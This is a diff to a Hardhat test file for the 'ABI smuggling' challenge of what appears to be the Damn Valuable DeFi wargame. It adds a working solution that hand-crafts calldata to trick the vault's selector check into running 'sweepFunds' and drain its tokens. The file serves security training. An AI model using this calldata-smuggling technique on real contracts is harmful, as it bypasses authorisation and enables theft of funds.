@@ -4,12 +4,12 @@ const { expect } = require('chai');
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
     let token, vault;
-    
+
     const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [ deployer, player, recovery ] = await ethers.getSigners();
+        [deployer, player, recovery] = await ethers.getSigners();
 
         // Deploy Damn Valuable Token contract
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
@@ -45,6 +45,27 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let fragment = await vault.interface.getFunction("execute");
+        const execute = await vault.interface.getSighash(fragment);
+
+        const vaultAddress = ethers.utils.hexZeroPad(vault.address, 32);
+
+        fragment = await vault.interface.getFunction("withdraw");
+        const withdraw = await vault.interface.getSighash(fragment);
+
+        const padding32 = ethers.utils.hexZeroPad("0x0", 32);
+
+        const exploitOffset = ethers.utils.hexZeroPad("0x64", 32);
+        const exploitSize = ethers.utils.hexZeroPad("0x44", 32);
+
+        const exploit = await vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+
+        const padding24 = ethers.utils.hexZeroPad("0x0", 24);
+
+        const actionData = ethers.utils.hexConcat([exploitOffset, padding32, withdraw, exploitSize, exploit, padding24])
+        const calldata = ethers.utils.hexConcat([execute, vaultAddress, actionData])
+
+        await player.sendTransaction({ to: vault.address, data: calldata })
     });
 
     after(async function () {
